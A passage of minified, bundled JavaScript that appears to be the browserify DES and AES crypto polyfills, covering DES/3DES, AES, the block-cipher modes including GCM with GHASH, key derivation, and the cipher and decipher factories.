            b.prototype[F] = j[F]
        }
        return b.create = function(K) {
            return new b(K)
        }
        ,
        b
    }
    return cbc$1.instantiate = x,
    j._cbcInit = function() {
        var b = new O(this.options.iv);
        this._cbcState = b
    }
    ,
    j._update = function(b, X, Y, F) {
        var V = this._cbcState
          , K = this.constructor.super_.prototype
          , Q = V.iv;
        if (this.type === "encrypt") {
            for (var ee = 0; ee < this.blockSize; ee++)
                Q[ee] ^= b[X + ee];
            K._update.call(this, Q, 0, Y, F);
            for (var ee = 0; ee < this.blockSize; ee++)
                Q[ee] = Y[F + ee]
        } else {
            K._update.call(this, b, X, Y, F);
            for (var ee = 0; ee < this.blockSize; ee++)
                Y[F + ee] ^= Q[ee];
            for (var ee = 0; ee < this.blockSize; ee++)
                Q[ee] = b[X + ee]
        }
    }
    ,
    cbc$1
}
var ede, hasRequiredEde;
function requireEde() {
    if (hasRequiredEde)
        return ede;
    hasRequiredEde = 1;
    var _ = requireMinimalisticAssert()
      , M = requireInherits_browser()
      , j = requireCipher()
      , O = requireDes$1();
    function x(b, X) {
        _.equal(X.length, 24, "Invalid key length");
        var Y = X.slice(0, 8)
          , F = X.slice(8, 16)
          , V = X.slice(16, 24);
        b === "encrypt" ? this.ciphers = [O.create({
            type: "encrypt",
            key: Y
        }), O.create({
            type: "decrypt",
            key: F
        }), O.create({
            type: "encrypt",
            key: V
        })] : this.ciphers = [O.create({
            type: "decrypt",
            key: V
        }), O.create({
            type: "encrypt",
            key: F
        }), O.create({
            type: "decrypt",
            key: Y
        })]
    }
    function w(b) {
        j.call(this, b);
        var X = new x(this.type,this.options.key);
        this._edeState = X
    }
    return M(w, j),
    ede = w,
    w.create = function(X) {
        return new w(X)
    }
    ,
    w.prototype._update = function(X, Y, F, V) {
        var K = this._edeState;
        K.ciphers[0]._update(X, Y, F, V),
        K.ciphers[1]._update(F, V, F, V),
        K.ciphers[2]._update(F, V, F, V)
    }
    ,
    w.prototype._pad = O.prototype._pad,
    w.prototype._unpad = O.prototype._unpad,
    ede
}
var hasRequiredDes;
function requireDes() {
    return hasRequiredDes || (hasRequiredDes = 1,
    des$1.utils = requireUtils$7(),
    des$1.Cipher = requireCipher(),
    des$1.DES = requireDes$1(),
    des$1.CBC = requireCbc$1(),
    des$1.EDE = requireEde()),
    des$1
}
var browserifyDes, hasRequiredBrowserifyDes;
function requireBrowserifyDes() {
    if (hasRequiredBrowserifyDes)
        return browserifyDes;
    hasRequiredBrowserifyDes = 1;
    var _ = requireCipherBase()
      , M = requireDes()
      , j = requireInherits_browser()
      , O = requireSafeBuffer$1().Buffer
      , x = {
        "des-ede3-cbc": M.CBC.instantiate(M.EDE),
        "des-ede3": M.EDE,
        "des-ede-cbc": M.CBC.instantiate(M.EDE),
        "des-ede": M.EDE,
        "des-cbc": M.CBC.instantiate(M.DES),
        "des-ecb": M.DES
    };
    x.des = x["des-cbc"],
    x.des3 = x["des-ede3-cbc"],
    browserifyDes = w,
    j(w, _);
    function w(b) {
        _.call(this);
        var X = b.mode.toLowerCase(), Y = x[X], F;
        b.decrypt ? F = "decrypt" : F = "encrypt";
        var V = b.key;
        O.isBuffer(V) || (V = O.from(V)),
        (X === "des-ede" || X === "des-ede-cbc") && (V = O.concat([V, V.slice(0, 8)]));
        var K = b.iv;
        O.isBuffer(K) || (K = O.from(K)),
        this._des = Y.create({
            key: V,
            iv: K,
            type: F
        })
    }
    return w.prototype._update = function(b) {
        return O.from(this._des.update(b))
    }
    ,
    w.prototype._final = function() {
        return O.from(this._des.final())
    }
    ,
    browserifyDes
}
var browser$8 = {}, encrypter = {}, ecb = {}, hasRequiredEcb;
function requireEcb() {
    return hasRequiredEcb || (hasRequiredEcb = 1,
    ecb.encrypt = function(_, M) {
        return _._cipher.encryptBlock(M)
    }
    ,
    ecb.decrypt = function(_, M) {
        return _._cipher.decryptBlock(M)
    }
    ),
    ecb
}
var cbc = {}, bufferXor, hasRequiredBufferXor;
function requireBufferXor() {
    return hasRequiredBufferXor || (hasRequiredBufferXor = 1,
    bufferXor = function(M, j) {
        for (var O = Math.min(M.length, j.length), x = new Buffer(O), w = 0; w < O; ++w)
            x[w] = M[w] ^ j[w];
        return x
    }
    ),
    bufferXor
}
var hasRequiredCbc;
function requireCbc() {
    if (hasRequiredCbc)
        return cbc;
    hasRequiredCbc = 1;
    var _ = requireBufferXor();
    return cbc.encrypt = function(M, j) {
        var O = _(j, M._prev);
        return M._prev = M._cipher.encryptBlock(O),
        M._prev
    }
    ,
    cbc.decrypt = function(M, j) {
        var O = M._prev;
        M._prev = j;
        var x = M._cipher.decryptBlock(j);
        return _(x, O)
    }
    ,
    cbc
}
var cfb = {}, hasRequiredCfb;
function requireCfb() {
    if (hasRequiredCfb)
        return cfb;
    hasRequiredCfb = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireBufferXor();
    function j(O, x, w) {
        var b = x.length
          , X = M(x, O._cache);
        return O._cache = O._cache.slice(b),
        O._prev = _.concat([O._prev, w ? x : X]),
        X
    }
    return cfb.encrypt = function(O, x, w) {
        for (var b = _.allocUnsafe(0), X; x.length; )
            if (O._cache.length === 0 && (O._cache = O._cipher.encryptBlock(O._prev),
            O._prev = _.allocUnsafe(0)),
            O._cache.length <= x.length)
                X = O._cache.length,
                b = _.concat([b, j(O, x.slice(0, X), w)]),
                x = x.slice(X);
            else {
                b = _.concat([b, j(O, x, w)]);
                break
            }
        return b
    }
    ,
    cfb
}
var cfb8 = {}, hasRequiredCfb8;
function requireCfb8() {
    if (hasRequiredCfb8)
        return cfb8;
    hasRequiredCfb8 = 1;
    var _ = requireSafeBuffer$1().Buffer;
    function M(j, O, x) {
        var w = j._cipher.encryptBlock(j._prev)
          , b = w[0] ^ O;
        return j._prev = _.concat([j._prev.slice(1), _.from([x ? O : b])]),
        b
    }
    return cfb8.encrypt = function(j, O, x) {
        for (var w = O.length, b = _.allocUnsafe(w), X = -1; ++X < w; )
            b[X] = M(j, O[X], x);
        return b
    }
    ,
    cfb8
}
var cfb1 = {}, hasRequiredCfb1;
function requireCfb1() {
    if (hasRequiredCfb1)
        return cfb1;
    hasRequiredCfb1 = 1;
    var _ = requireSafeBuffer$1().Buffer;
    function M(O, x, w) {
        for (var b, X = -1, Y = 8, F = 0, V, K; ++X < Y; )
            b = O._cipher.encryptBlock(O._prev),
            V = x & 1 << 7 - X ? 128 : 0,
            K = b[0] ^ V,
            F += (K & 128) >> X % 8,
            O._prev = j(O._prev, w ? V : K);
        return F
    }
    function j(O, x) {
        var w = O.length
          , b = -1
          , X = _.allocUnsafe(O.length);
        for (O = _.concat([O, _.from([x])]); ++b < w; )
            X[b] = O[b] << 1 | O[b + 1] >> 7;
        return X
    }
    return cfb1.encrypt = function(O, x, w) {
        for (var b = x.length, X = _.allocUnsafe(b), Y = -1; ++Y < b; )
            X[Y] = M(O, x[Y], w);
        return X
    }
    ,
    cfb1
}
var ofb = {}, hasRequiredOfb;
function requireOfb() {
    if (hasRequiredOfb)
        return ofb;
    hasRequiredOfb = 1;
    var _ = requireBufferXor();
    function M(j) {
        return j._prev = j._cipher.encryptBlock(j._prev),
        j._prev
    }
    return ofb.encrypt = function(j, O) {
        for (; j._cache.length < O.length; )
            j._cache = Buffer.concat([j._cache, M(j)]);
        var x = j._cache.slice(0, O.length);
        return j._cache = j._cache.slice(O.length),
        _(O, x)
    }
    ,
    ofb
}
var ctr = {}, incr32_1, hasRequiredIncr32;
function requireIncr32() {
    if (hasRequiredIncr32)
        return incr32_1;
    hasRequiredIncr32 = 1;
    function _(M) {
        for (var j = M.length, O; j--; )
            if (O = M.readUInt8(j),
            O === 255)
                M.writeUInt8(0, j);
            else {
                O++,
                M.writeUInt8(O, j);
                break
            }
    }
    return incr32_1 = _,
    incr32_1
}
var hasRequiredCtr;
function requireCtr() {
    if (hasRequiredCtr)
        return ctr;
    hasRequiredCtr = 1;
    var _ = requireBufferXor()
      , M = requireSafeBuffer$1().Buffer
      , j = requireIncr32();
    function O(w) {
        var b = w._cipher.encryptBlockRaw(w._prev);
        return j(w._prev),
        b
    }
    var x = 16;
    return ctr.encrypt = function(w, b) {
        var X = Math.ceil(b.length / x)
          , Y = w._cache.length;
        w._cache = M.concat([w._cache, M.allocUnsafe(X * x)]);
        for (var F = 0; F < X; F++) {
            var V = O(w)
              , K = Y + F * x;
            w._cache.writeUInt32BE(V[0], K + 0),
            w._cache.writeUInt32BE(V[1], K + 4),
            w._cache.writeUInt32BE(V[2], K + 8),
            w._cache.writeUInt32BE(V[3], K + 12)
        }
        var Q = w._cache.slice(0, b.length);
        return w._cache = w._cache.slice(b.length),
        _(b, Q)
    }
    ,
    ctr
}
const aes128 = {
    cipher: "AES",
    key: 128,
    iv: 16,
    mode: "CBC",
    type: "block"
}
  , aes192 = {
    cipher: "AES",
    key: 192,
    iv: 16,
    mode: "CBC",
    type: "block"
}
  , aes256 = {
    cipher: "AES",
    key: 256,
    iv: 16,
    mode: "CBC",
    type: "block"
}
  , require$$2$1 = {
    "aes-128-ecb": {
        cipher: "AES",
        key: 128,
        iv: 0,
        mode: "ECB",
        type: "block"
    },
    "aes-192-ecb": {
        cipher: "AES",
        key: 192,
        iv: 0,
        mode: "ECB",
        type: "block"
    },
    "aes-256-ecb": {
        cipher: "AES",
        key: 256,
        iv: 0,
        mode: "ECB",
        type: "block"
    },
    "aes-128-cbc": {
        cipher: "AES",
        key: 128,
        iv: 16,
        mode: "CBC",
        type: "block"
    },
    "aes-192-cbc": {
        cipher: "AES",
        key: 192,
        iv: 16,
        mode: "CBC",
        type: "block"
    },
    "aes-256-cbc": {
        cipher: "AES",
        key: 256,
        iv: 16,
        mode: "CBC",
        type: "block"
    },
    aes128,
    aes192,
    aes256,
    "aes-128-cfb": {
        cipher: "AES",
        key: 128,
        iv: 16,
        mode: "CFB",
        type: "stream"
    },
    "aes-192-cfb": {
        cipher: "AES",
        key: 192,
        iv: 16,
        mode: "CFB",
        type: "stream"
    },
    "aes-256-cfb": {
        cipher: "AES",
        key: 256,
        iv: 16,
        mode: "CFB",
        type: "stream"
    },
    "aes-128-cfb8": {
        cipher: "AES",
        key: 128,
        iv: 16,
        mode: "CFB8",
        type: "stream"
    },
    "aes-192-cfb8": {
        cipher: "AES",
        key: 192,
        iv: 16,
        mode: "CFB8",
        type: "stream"
    },
    "aes-256-cfb8": {
        cipher: "AES",
        key: 256,
        iv: 16,
        mode: "CFB8",
        type: "stream"
    },
    "aes-128-cfb1": {
        cipher: "AES",
        key: 128,
        iv: 16,
        mode: "CFB1",
        type: "stream"
    },
    "aes-192-cfb1": {
        cipher: "AES",
        key: 192,
        iv: 16,
        mode: "CFB1",
        type: "stream"
    },
    "aes-256-cfb1": {
        cipher: "AES",
        key: 256,
        iv: 16,
        mode: "CFB1",
        type: "stream"
    },
    "aes-128-ofb": {
        cipher: "AES",
        key: 128,
        iv: 16,
        mode: "OFB",
        type: "stream"
    },
    "aes-192-ofb": {
        cipher: "AES",
        key: 192,
        iv: 16,
        mode: "OFB",
        type: "stream"
    },
    "aes-256-ofb": {
        cipher: "AES",
        key: 256,
        iv: 16,
        mode: "OFB",
        type: "stream"
    },
    "aes-128-ctr": {
        cipher: "AES",
        key: 128,
        iv: 16,
        mode: "CTR",
        type: "stream"
    },
    "aes-192-ctr": {
        cipher: "AES",
        key: 192,
        iv: 16,
        mode: "CTR",
        type: "stream"
    },
    "aes-256-ctr": {
        cipher: "AES",
        key: 256,
        iv: 16,
        mode: "CTR",
        type: "stream"
    },
    "aes-128-gcm": {
        cipher: "AES",
        key: 128,
        iv: 12,
        mode: "GCM",
        type: "auth"
    },
    "aes-192-gcm": {
        cipher: "AES",
        key: 192,
        iv: 12,
        mode: "GCM",
        type: "auth"
    },
    "aes-256-gcm": {
        cipher: "AES",
        key: 256,
        iv: 12,
        mode: "GCM",
        type: "auth"
    }
};
var modes_1, hasRequiredModes$1;
function requireModes$1() {
    if (hasRequiredModes$1)
        return modes_1;
    hasRequiredModes$1 = 1;
    var _ = {
        ECB: requireEcb(),
        CBC: requireCbc(),
        CFB: requireCfb(),
        CFB8: requireCfb8(),
        CFB1: requireCfb1(),
        OFB: requireOfb(),
        CTR: requireCtr(),
        GCM: requireCtr()
    }
      , M = require$$2$1;
    for (var j in M)
        M[j].module = _[M[j].mode];
    return modes_1 = M,
    modes_1
}
var aes = {}, hasRequiredAes;
function requireAes() {
    if (hasRequiredAes)
        return aes;
    hasRequiredAes = 1;
    var _ = requireSafeBuffer$1().Buffer;
    function M(X) {
        _.isBuffer(X) || (X = _.from(X));
        for (var Y = X.length / 4 | 0, F = new Array(Y), V = 0; V < Y; V++)
            F[V] = X.readUInt32BE(V * 4);
        return F
    }
    function j(X) {
        for (var Y = 0; Y < X.length; X++)
            X[Y] = 0
    }
    function O(X, Y, F, V, K) {
        for (var Q = F[0], ee = F[1], ae = F[2], ne = F[3], oe = X[0] ^ Y[0], ue = X[1] ^ Y[1], fe = X[2] ^ Y[2], he = X[3] ^ Y[3], pe, ye, be, xe, Ae = 4, Ee = 1; Ee < K; Ee++)
            pe = Q[oe >>> 24] ^ ee[ue >>> 16 & 255] ^ ae[fe >>> 8 & 255] ^ ne[he & 255] ^ Y[Ae++],
            ye = Q[ue >>> 24] ^ ee[fe >>> 16 & 255] ^ ae[he >>> 8 & 255] ^ ne[oe & 255] ^ Y[Ae++],
            be = Q[fe >>> 24] ^ ee[he >>> 16 & 255] ^ ae[oe >>> 8 & 255] ^ ne[ue & 255] ^ Y[Ae++],
            xe = Q[he >>> 24] ^ ee[oe >>> 16 & 255] ^ ae[ue >>> 8 & 255] ^ ne[fe & 255] ^ Y[Ae++],
            oe = pe,
            ue = ye,
            fe = be,
            he = xe;
        return pe = (V[oe >>> 24] << 24 | V[ue >>> 16 & 255] << 16 | V[fe >>> 8 & 255] << 8 | V[he & 255]) ^ Y[Ae++],
        ye = (V[ue >>> 24] << 24 | V[fe >>> 16 & 255] << 16 | V[he >>> 8 & 255] << 8 | V[oe & 255]) ^ Y[Ae++],
        be = (V[fe >>> 24] << 24 | V[he >>> 16 & 255] << 16 | V[oe >>> 8 & 255] << 8 | V[ue & 255]) ^ Y[Ae++],
        xe = (V[he >>> 24] << 24 | V[oe >>> 16 & 255] << 16 | V[ue >>> 8 & 255] << 8 | V[fe & 255]) ^ Y[Ae++],
        pe = pe >>> 0,
        ye = ye >>> 0,
        be = be >>> 0,
        xe = xe >>> 0,
        [pe, ye, be, xe]
    }
    var x = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54]
      , w = function() {
        for (var X = new Array(256), Y = 0; Y < 256; Y++)
            Y < 128 ? X[Y] = Y << 1 : X[Y] = Y << 1 ^ 283;
        for (var F = [], V = [], K = [[], [], [], []], Q = [[], [], [], []], ee = 0, ae = 0, ne = 0; ne < 256; ++ne) {
            var oe = ae ^ ae << 1 ^ ae << 2 ^ ae << 3 ^ ae << 4;
            oe = oe >>> 8 ^ oe & 255 ^ 99,
            F[ee] = oe,
            V[oe] = ee;
            var ue = X[ee]
              , fe = X[ue]
              , he = X[fe]
              , pe = X[oe] * 257 ^ oe * 16843008;
            K[0][ee] = pe << 24 | pe >>> 8,
            K[1][ee] = pe << 16 | pe >>> 16,
            K[2][ee] = pe << 8 | pe >>> 24,
            K[3][ee] = pe,
            pe = he * 16843009 ^ fe * 65537 ^ ue * 257 ^ ee * 16843008,
            Q[0][oe] = pe << 24 | pe >>> 8,
            Q[1][oe] = pe << 16 | pe >>> 16,
            Q[2][oe] = pe << 8 | pe >>> 24,
            Q[3][oe] = pe,
            ee === 0 ? ee = ae = 1 : (ee = ue ^ X[X[X[he ^ ue]]],
            ae ^= X[X[ae]])
        }
        return {
            SBOX: F,
            INV_SBOX: V,
            SUB_MIX: K,
            INV_SUB_MIX: Q
        }
    }();
    function b(X) {
        this._key = M(X),
        this._reset()
    }
    return b.blockSize = 4 * 4,
    b.keySize = 256 / 8,
    b.prototype.blockSize = b.blockSize,
    b.prototype.keySize = b.keySize,
    b.prototype._reset = function() {
        for (var X = this._key, Y = X.length, F = Y + 6, V = (F + 1) * 4, K = [], Q = 0; Q < Y; Q++)
            K[Q] = X[Q];
        for (Q = Y; Q < V; Q++) {
            var ee = K[Q - 1];
            Q % Y === 0 ? (ee = ee << 8 | ee >>> 24,
            ee = w.SBOX[ee >>> 24] << 24 | w.SBOX[ee >>> 16 & 255] << 16 | w.SBOX[ee >>> 8 & 255] << 8 | w.SBOX[ee & 255],
            ee ^= x[Q / Y | 0] << 24) : Y > 6 && Q % Y === 4 && (ee = w.SBOX[ee >>> 24] << 24 | w.SBOX[ee >>> 16 & 255] << 16 | w.SBOX[ee >>> 8 & 255] << 8 | w.SBOX[ee & 255]),
            K[Q] = K[Q - Y] ^ ee
        }
        for (var ae = [], ne = 0; ne < V; ne++) {
            var oe = V - ne
              , ue = K[oe - (ne % 4 ? 0 : 4)];
            ne < 4 || oe <= 4 ? ae[ne] = ue : ae[ne] = w.INV_SUB_MIX[0][w.SBOX[ue >>> 24]] ^ w.INV_SUB_MIX[1][w.SBOX[ue >>> 16 & 255]] ^ w.INV_SUB_MIX[2][w.SBOX[ue >>> 8 & 255]] ^ w.INV_SUB_MIX[3][w.SBOX[ue & 255]]
        }
        this._nRounds = F,
        this._keySchedule = K,
        this._invKeySchedule = ae
    }
    ,
    b.prototype.encryptBlockRaw = function(X) {
        return X = M(X),
        O(X, this._keySchedule, w.SUB_MIX, w.SBOX, this._nRounds)
    }
    ,
    b.prototype.encryptBlock = function(X) {
        var Y = this.encryptBlockRaw(X)
          , F = _.allocUnsafe(16);
        return F.writeUInt32BE(Y[0], 0),
        F.writeUInt32BE(Y[1], 4),
        F.writeUInt32BE(Y[2], 8),
        F.writeUInt32BE(Y[3], 12),
        F
    }
    ,
    b.prototype.decryptBlock = function(X) {
        X = M(X);
        var Y = X[1];
        X[1] = X[3],
        X[3] = Y;
        var F = O(X, this._invKeySchedule, w.INV_SUB_MIX, w.INV_SBOX, this._nRounds)
          , V = _.allocUnsafe(16);
        return V.writeUInt32BE(F[0], 0),
        V.writeUInt32BE(F[3], 4),
        V.writeUInt32BE(F[2], 8),
        V.writeUInt32BE(F[1], 12),
        V
    }
    ,
    b.prototype.scrub = function() {
        j(this._keySchedule),
        j(this._invKeySchedule),
        j(this._key)
    }
    ,
    aes.AES = b,
    aes
}
var ghash, hasRequiredGhash;
function requireGhash() {
    if (hasRequiredGhash)
        return ghash;
    hasRequiredGhash = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = _.alloc(16, 0);
    function j(w) {
        return [w.readUInt32BE(0), w.readUInt32BE(4), w.readUInt32BE(8), w.readUInt32BE(12)]
    }
    function O(w) {
        var b = _.allocUnsafe(16);
        return b.writeUInt32BE(w[0] >>> 0, 0),
        b.writeUInt32BE(w[1] >>> 0, 4),
        b.writeUInt32BE(w[2] >>> 0, 8),
        b.writeUInt32BE(w[3] >>> 0, 12),
        b
    }
    function x(w) {
        this.h = w,
        this.state = _.alloc(16, 0),
        this.cache = _.allocUnsafe(0)
    }
    return x.prototype.ghash = function(w) {
        for (var b = -1; ++b < w.length; )
            this.state[b] ^= w[b];
        this._multiply()
    }
    ,
    x.prototype._multiply = function() {
        for (var w = j(this.h), b = [0, 0, 0, 0], X, Y, F, V = -1; ++V < 128; ) {
            for (Y = (this.state[~~(V / 8)] & 1 << 7 - V % 8) !== 0,
            Y && (b[0] ^= w[0],
            b[1] ^= w[1],
            b[2] ^= w[2],
            b[3] ^= w[3]),
            F = (w[3] & 1) !== 0,
            X = 3; X > 0; X--)
                w[X] = w[X] >>> 1 | (w[X - 1] & 1) << 31;
            w[0] = w[0] >>> 1,
            F && (w[0] = w[0] ^ 225 << 24)
        }
        this.state = O(b)
    }
    ,
    x.prototype.update = function(w) {
        this.cache = _.concat([this.cache, w]);
        for (var b; this.cache.length >= 16; )
            b = this.cache.slice(0, 16),
            this.cache = this.cache.slice(16),
            this.ghash(b)
    }
    ,
    x.prototype.final = function(w, b) {
        return this.cache.length && this.ghash(_.concat([this.cache, M], 16)),
        this.ghash(O([0, w, 0, b])),
        this.state
    }
    ,
    ghash = x,
    ghash
}
var authCipher, hasRequiredAuthCipher;
function requireAuthCipher() {
    if (hasRequiredAuthCipher)
        return authCipher;
    hasRequiredAuthCipher = 1;
    var _ = requireAes()
      , M = requireSafeBuffer$1().Buffer
      , j = requireCipherBase()
      , O = requireInherits_browser()
      , x = requireGhash()
      , w = requireBufferXor()
      , b = requireIncr32();
    function X(V, K) {
        var Q = 0;
        V.length !== K.length && Q++;
        for (var ee = Math.min(V.length, K.length), ae = 0; ae < ee; ++ae)
            Q += V[ae] ^ K[ae];
        return Q
    }
    function Y(V, K, Q) {
        if (K.length === 12)
            return V._finID = M.concat([K, M.from([0, 0, 0, 1])]),
            M.concat([K, M.from([0, 0, 0, 2])]);
        var ee = new x(Q)
          , ae = K.length
          , ne = ae % 16;
        ee.update(K),
        ne && (ne = 16 - ne,
        ee.update(M.alloc(ne, 0))),
        ee.update(M.alloc(8, 0));
        var oe = ae * 8
          , ue = M.alloc(8);
        ue.writeUIntBE(oe, 0, 8),
        ee.update(ue),
        V._finID = ee.state;
        var fe = M.from(V._finID);
        return b(fe),
        fe
    }
    function F(V, K, Q, ee) {
        j.call(this);
        var ae = M.alloc(4, 0);
        this._cipher = new _.AES(K);
        var ne = this._cipher.encryptBlock(ae);
        this._ghash = new x(ne),
        Q = Y(this, Q, ne),
        this._prev = M.from(Q),
        this._cache = M.allocUnsafe(0),
        this._secCache = M.allocUnsafe(0),
        this._decrypt = ee,
        this._alen = 0,
        this._len = 0,
        this._mode = V,
        this._authTag = null,
        this._called = !1
    }
    return O(F, j),
    F.prototype._update = function(V) {
        if (!this._called && this._alen) {
            var K = 16 - this._alen % 16;
            K < 16 && (K = M.alloc(K, 0),
            this._ghash.update(K))
        }
        this._called = !0;
        var Q = this._mode.encrypt(this, V);
        return this._decrypt ? this._ghash.update(V) : this._ghash.update(Q),
        this._len += V.length,
        Q
    }
    ,
    F.prototype._final = function() {
        if (this._decrypt && !this._authTag)
            throw new Error("Unsupported state or unable to authenticate data");
        var V = w(this._ghash.final(this._alen * 8, this._len * 8), this._cipher.encryptBlock(this._finID));
        if (this._decrypt && X(V, this._authTag))
            throw new Error("Unsupported state or unable to authenticate data");
        this._authTag = V,
        this._cipher.scrub()
    }
    ,
    F.prototype.getAuthTag = function() {
        if (this._decrypt || !M.isBuffer(this._authTag))
            throw new Error("Attempting to get auth tag in unsupported state");
        return this._authTag
    }
    ,
    F.prototype.setAuthTag = function(K) {
        if (!this._decrypt)
            throw new Error("Attempting to set auth tag in unsupported state");
        this._authTag = K
    }
    ,
    F.prototype.setAAD = function(K) {
        if (this._called)
            throw new Error("Attempting to set AAD in unsupported state");
        this._ghash.update(K),
        this._alen += K.length
    }
    ,
    authCipher = F,
    authCipher
}
var streamCipher, hasRequiredStreamCipher;
function requireStreamCipher() {
    if (hasRequiredStreamCipher)
        return streamCipher;
    hasRequiredStreamCipher = 1;
    var _ = requireAes()
      , M = requireSafeBuffer$1().Buffer
      , j = requireCipherBase()
      , O = requireInherits_browser();
    function x(w, b, X, Y) {
        j.call(this),
        this._cipher = new _.AES(b),
        this._prev = M.from(X),
        this._cache = M.allocUnsafe(0),
        this._secCache = M.allocUnsafe(0),
        this._decrypt = Y,
        this._mode = w
    }
    return O(x, j),
    x.prototype._update = function(w) {
        return this._mode.encrypt(this, w, this._decrypt)
    }
    ,
    x.prototype._final = function() {
        this._cipher.scrub()
    }
    ,
    streamCipher = x,
    streamCipher
}
var evp_bytestokey, hasRequiredEvp_bytestokey;
function requireEvp_bytestokey() {
    if (hasRequiredEvp_bytestokey)
        return evp_bytestokey;
    hasRequiredEvp_bytestokey = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireMd5_js();
    function j(O, x, w, b) {
        if (_.isBuffer(O) || (O = _.from(O, "binary")),
        x && (_.isBuffer(x) || (x = _.from(x, "binary")),
        x.length !== 8))
            throw new RangeError("salt should be Buffer with 8 byte length");
        for (var X = w / 8, Y = _.alloc(X), F = _.alloc(b || 0), V = _.alloc(0); X > 0 || b > 0; ) {
            var K = new M;
            K.update(V),
            K.update(O),
            x && K.update(x),
            V = K.digest();
            var Q = 0;
            if (X > 0) {
                var ee = Y.length - X;
                Q = Math.min(X, V.length),
                V.copy(Y, ee, 0, Q),
                X -= Q
            }
            if (Q < V.length && b > 0) {
                var ae = F.length - b
                  , ne = Math.min(b, V.length - Q);
                V.copy(F, ae, Q, Q + ne),
                b -= ne
            }
        }
        return V.fill(0),
        {
            key: Y,
            iv: F
        }
    }
    return evp_bytestokey = j,
    evp_bytestokey
}
var hasRequiredEncrypter;
function requireEncrypter() {
    if (hasRequiredEncrypter)
        return encrypter;
    hasRequiredEncrypter = 1;
    var _ = requireModes$1()
      , M = requireAuthCipher()
      , j = requireSafeBuffer$1().Buffer
      , O = requireStreamCipher()
      , x = requireCipherBase()
      , w = requireAes()
      , b = requireEvp_bytestokey()
      , X = requireInherits_browser();
    function Y(ee, ae, ne) {
        x.call(this),
        this._cache = new V,
        this._cipher = new w.AES(ae),
        this._prev = j.from(ne),
        this._mode = ee,
        this._autopadding = !0
    }
    X(Y, x),
    Y.prototype._update = function(ee) {
        this._cache.add(ee);
        for (var ae, ne, oe = []; ae = this._cache.get(); )
            ne = this._mode.encrypt(this, ae),
            oe.push(ne);
        return j.concat(oe)
    }
    ;
    var F = j.alloc(16, 16);
    Y.prototype._final = function() {
        var ee = this._cache.flush();
        if (this._autopadding)
            return ee = this._mode.encrypt(this, ee),
            this._cipher.scrub(),
            ee;
        if (!ee.equals(F))
            throw this._cipher.scrub(),
            new Error("data not multiple of block length")
    }
    ,
    Y.prototype.setAutoPadding = function(ee) {
        return this._autopadding = !!ee,
        this
    }
    ;
    function V() {
        this.cache = j.allocUnsafe(0)
    }
    V.prototype.add = function(ee) {
        this.cache = j.concat([this.cache, ee])
    }
    ,
    V.prototype.get = function() {
        if (this.cache.length > 15) {
            var ee = this.cache.slice(0, 16);
            return this.cache = this.cache.slice(16),
            ee
        }
        return null
    }
    ,
    V.prototype.flush = function() {
        for (var ee = 16 - this.cache.length, ae = j.allocUnsafe(ee), ne = -1; ++ne < ee; )
            ae.writeUInt8(ee, ne);
        return j.concat([this.cache, ae])
    }
    ;
    function K(ee, ae, ne) {
        var oe = _[ee.toLowerCase()];
        if (!oe)
            throw new TypeError("invalid suite type");
        if (typeof ae == "string" && (ae = j.from(ae)),
        ae.length !== oe.key / 8)
            throw new TypeError("invalid key length " + ae.length);
        if (typeof ne == "string" && (ne = j.from(ne)),
        oe.mode !== "GCM" && ne.length !== oe.iv)
            throw new TypeError("invalid iv length " + ne.length);
        return oe.type === "stream" ? new O(oe.module,ae,ne) : oe.type === "auth" ? new M(oe.module,ae,ne) : new Y(oe.module,ae,ne)
    }
    function Q(ee, ae) {
        var ne = _[ee.toLowerCase()];
        if (!ne)
            throw new TypeError("invalid suite type");
        var oe = b(ae, !1, ne.key, ne.iv);
        return K(ee, oe.key, oe.iv)
    }
    return encrypter.createCipheriv = K,
    encrypter.createCipher = Q,
    encrypter
}
var decrypter = {}, hasRequiredDecrypter;
function requireDecrypter() {
    if (hasRequiredDecrypter)
        return decrypter;
    hasRequiredDecrypter = 1;
    var _ = requireAuthCipher()
      , M = requireSafeBuffer$1().Buffer
      , j = requireModes$1()
      , O = requireStreamCipher()
      , x = requireCipherBase()
      , w = requireAes()
      , b = requireEvp_bytestokey()
      , X = requireInherits_browser();
    function Y(ee, ae, ne) {
        x.call(this),
        this._cache = new F,
        this._last = void 0,
        this._cipher = new w.AES(ae),
        this._prev = M.from(ne),
        this._mode = ee,
        this._autopadding = !0
    }
    X(Y, x),
    Y.prototype._update = function(ee) {
        this._cache.add(ee);
        for (var ae, ne, oe = []; ae = this._cache.get(this._autopadding); )
            ne = this._mode.decrypt(this, ae),
            oe.push(ne);
        return M.concat(oe)
    }
    ,
    Y.prototype._final = function() {
        var ee = this._cache.flush();
        if (this._autopadding)
            return V(this._mode.decrypt(this, ee));
        if (ee)
            throw new Error("data not multiple of block length")
    }
    ,
    Y.prototype.setAutoPadding = function(ee) {
        return this._autopadding = !!ee,
        this
    }
    ;
    function F() {
        this.cache = M.allocUnsafe(0)
    }
    F.prototype.add = function(ee) {
        this.cache = M.concat([this.cache, ee])
    }
    ,
    F.prototype.get = function(ee) {
        var ae;
        if (ee) {
            if (this.cache.length > 16)
                return ae = this.cache.slice(0, 16),
                this.cache = this.cache.slice(16),
                ae
        } else if (this.cache.length >= 16)
            return ae = this.cache.slice(0, 16),
            this.cache = this.cache.slice(16),
            ae;
        return null
    }
    ,
    F.prototype.flush = function() {
        if (this.cache.length)
            return this.cache
    }
    ;
    function V(ee) {
        var ae = ee[15];
        if (ae < 1 || ae > 16)
            throw new Error("unable to decrypt data");
        for (var ne = -1; ++ne < ae; )
            if (ee[ne + (16 - ae)] !== ae)
                throw new Error("unable to decrypt data");
        if (ae !== 16)
            return ee.slice(0, 16 - ae)
    }
    function K(ee, ae, ne) {
        var oe = j[ee.toLowerCase()];
        if (!oe)
            throw new TypeError("invalid suite type");
        if (typeof ne == "string" && (ne = M.from(ne)),
        oe.mode !== "GCM" && ne.length !== oe.iv)
            throw new TypeError("invalid iv length " + ne.length);
        if (typeof ae == "string" && (ae = M.from(ae)),
        ae.length !== oe.key / 8)
            throw new TypeError("invalid key length " + ae.length);
        return oe.type === "stream" ? new O(oe.module,ae,ne,!0) : oe.type === "auth" ? new _(oe.module,ae,ne,!0) : new Y(oe.module,ae,ne)
    }
    function Q(ee, ae) {
        var ne = j[ee.toLowerCase()];
        if (!ne)
